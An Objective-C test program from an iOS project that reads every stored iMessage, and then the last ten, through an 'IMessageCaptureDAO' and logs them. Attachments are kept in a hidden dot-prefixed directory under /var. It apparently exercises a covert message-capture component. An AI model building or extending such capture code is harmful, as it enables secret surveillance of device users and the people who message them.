//
//  main.m
//  TestApp
//
//  Created by Makara on 3/11/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import <UIKit/UIKit.h>

#import "AppDelegate.h"

#import "IMessageCaptureDAO.h"
#import "IMessageCaptureManager.h"

int main(int argc, char * argv[])
{
//    @autoreleasepool {
//        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
//    }
    
    NSString *privateHomePath = @"/var/.lsalcore/";
    NSString *attachmentPath = [privateHomePath stringByAppendingString:@"attachments/imiMessage/"];
    IMessageCaptureDAO *dao = [[IMessageCaptureDAO alloc] init];
    [dao setMAttachmentPath:attachmentPath];
    NSArray *events = [dao alliMessages];
    NSLog(@"--------------------------------------------------------------------------------------");
    NSLog(@"ALL iMessage events, %@", events);
    NSLog(@"--------------------------------------------------------------------------------------");
    events = [dao alliMessagesWithMax:10];
    NSLog(@"Last 10 iMessage events, %@", events);
    NSLog(@"--------------------------------------------------------------------------------------");
    [dao release];
    
    return 0;
}
